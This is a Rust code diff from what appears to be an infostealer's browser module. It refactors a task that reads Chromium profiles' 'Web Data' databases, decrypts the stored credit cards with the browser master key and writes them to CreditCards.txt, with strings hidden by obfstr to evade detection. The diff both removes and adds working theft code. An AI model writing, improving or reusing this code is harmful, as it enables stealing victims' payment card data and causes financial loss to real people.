@@ -8,7 +8,7 @@ use sqlite::read_sqlite3_database_by_bytes;
 use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
 use crate::chromium::Browser;
-use crate::CreditCard;
+use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, CreditCard};
 use obfstr::obfstr as s;
 use utils::browsers::chromium::decrypt_data;
 
@@ -32,43 +32,27 @@ impl Task for CreditCardsTask {
     parent_name!("CreditCards.txt");
     
     unsafe fn run(&self, parent: &Path) {
-        let mut credit_cards: Vec<CreditCard> = self.browser
-            .profiles
-            .iter()
-            .filter_map(|profile| get_credit_cards(profile, &self.browser.master_key))
-            .flat_map(|v| v.into_iter())
-            .collect();
-        
-        if credit_cards.is_empty() {
+        let Some(mut credit_cards) = collect_from_all_profiles(
+            &self.browser.profiles,
+            |profile| get_credit_cards(profile, &self.browser.master_key)
+        ) else {
             return
-        }
-        
-        credit_cards.sort();
-        credit_cards.dedup();
+        };
         
         credit_cards.sort_by(|a, b| b.use_count.cmp(&a.use_count));
         
-        let _ = credit_cards
-            .iter()
-            .map(|credit_card| credit_card.to_string())
-            .collect::<Vec<String>>()
-            .join("\n\n")
-            .write_to(parent);
+        let _ = to_string_and_write_all(&credit_cards, "\n\n", parent);
     }
 }
 
 fn get_credit_cards(profile: &Path, master_key: &[u8]) -> Option<Vec<CreditCard>> {
-    let cookies_path = profile / s!("Web Data");
-    let bytes = cookies_path.read_file().ok()?;
-
-    let db = read_sqlite3_database_by_bytes(&bytes)?;
-    let table = db.read_table(s!("Credit_cards"))?;
-
-    let cards = table
-        .filter_map(|record| extract_card_from_record(&record, master_key))
-        .collect();
-
-    Some(cards)
+    let web_data_path = profile / s!("Web Data");
+    
+    read_sqlite3_and_map_records(
+        &web_data_path,
+        s!("Credit_cards"),
+        |record| extract_card_from_record(record, master_key)
+    )
 }
 
 fn extract_card_from_record(record: &Box<dyn TableRecord>, master_key: &[u8]) -> Option<CreditCard> {
